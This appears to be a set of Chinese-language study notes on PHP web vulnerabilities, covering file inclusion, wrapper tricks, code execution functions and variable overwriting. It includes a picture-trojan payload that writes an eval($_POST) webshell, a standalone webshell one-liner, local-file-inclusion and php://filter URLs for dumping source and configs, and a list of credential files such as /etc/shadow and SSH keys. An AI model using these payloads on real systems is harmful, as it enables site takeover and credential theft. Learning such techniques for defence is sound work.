# PHP相关漏洞

文件包含漏洞
php://input等伪协议利用
代码执行漏洞
变量覆盖漏洞

## 文件包含漏洞

程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件

而无需再次编写，这种文件调用的过程一般被称为文件包含

程序开发人员一般希望代码更灵活，所以导致客户端可以调用一个恶意文件，造成文件包含漏洞

几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多

而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端

在PHP中经常出现包含漏洞，但这并不意味着其他语言不存在

## 常见文件包含函数

include(): 执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行

require():只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本

include_once()和require_once():若文件中代码已被包含则不会再次包含

## 利用条件

程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件
用户能够控制该动态变量

漏洞危害
  执行任意代码
  包含恶意文件控制网站
  甚至控制服务器

## 漏洞分类

本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码
  上传图片马，然后包含
  读敏感文件，读PHP文件
  包含日志文件GetShell
  包含/proc/self/envion文件GetShell
  包含data:或php://input等伪协议
  若有phpinfo则可以包含临时文件

远程文件包含：可以直接执行任意代码

要保证php.ini中allow_url_fopen和allow_url_include要为On

## 漏洞挖掘

通过白盒代码审计
黑盒工具挖掘
awvs appscan burp
w3af

### 本地包含漏洞

文件包含漏洞利用条件
  1 include()等函数通过动态变量的方式引入需要包含的文件
  2 用户能控制该动态变量

本地包含漏洞注意事项
  相对路径
  %00截断包含(PHP<5.3.4)
magic_quotes_gps=off才可以，否则%00会被转义

利用技巧

上传图片马，马包含的代码为
<?fputs(fopen("shell.php","w"),"<?php eval($_POST[x]);?>")?>
上传后图片路径为/iploadfile/x.jpg,当访问http://www.cracer.com/xx.php?page=iploadfile/x.jpg时，将会在这个文件夹下生成shell.php，内容为<?php eval($_POST[x]);?>

### 读敏感文件

Windows：                                                         Linux:
C:\boot.ini  //查看系统版本                                        /root/.ssh/authorized_keys
c:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件            /root/.ssh/id_rsa
c:\Windows\repair\sam   //存储系统初次安装的密码                    /root/.ssh/id_ras.keystore
c:\Program Files\mysql\my.ini  //Mysql配置                        /root/.ssh/known_hosts
c:\Program Files\mysql\data\mysql\user.MYD   //Mysql root         /etc/passwd
c:\Windows\php.ini   //php配置信息                                 /etc/shadow
c:\Windows\my.ini    //Mysql配置信息                               /etc/my.cnf
                                                                  /etc/httpd/conf/httpd.conf
                                                                  /root/.bash_history
                                                                  /root/.mysql_history
                                                                  /proc/self/fd/fd[0-9]*(文件标识符)
                                                                  /proc/mounts
                                                                  /proc/config.gz

### 包含日志(主要是得到日志的路径)

读日志路径：
文件包含漏洞读取apache配置文件
index.php?page=/etc/init.d/httpd
index.php?page=/etc/httpd/conf/httpd.conf
默认位置/var/log/httpd/access_log

### 读PHP文件

直接包含php文件时，会被解析，不能看到源码，可以用封装协议读取：

?page=php://filter/read=convert.base64-encode/resource=config.php

访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码

# 代码执行漏洞

PHP中可以执行代码的函数。如eval()、assert()、"、system()、exec()、shell_exec()、passthru()、escapeshellcmd()、pcntl_exec()等

例如：
<?php eval($_POST[cc123]) ?>

## 命令执行函数

在php中您可以使用下列5个函数来执行外部的应用程序或函数

1 system: 执行一个外部的应用程序并显示输出的结果
2 exec:执行一个外部的应用程序
3 passthru: 执行一个UNIX系统命令并显示原始的输出
4 shell_exec:执行shell命令并返回输出的结果的字符串
5 “"” 运算符：与shell_exec函数的功能相同

# 变量覆盖漏洞产生

变量如果未初始化，且能被用户所控制
在php中，若register_globals为on时尤其严重
此为全局变量覆盖漏洞
当register_global=ON时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等

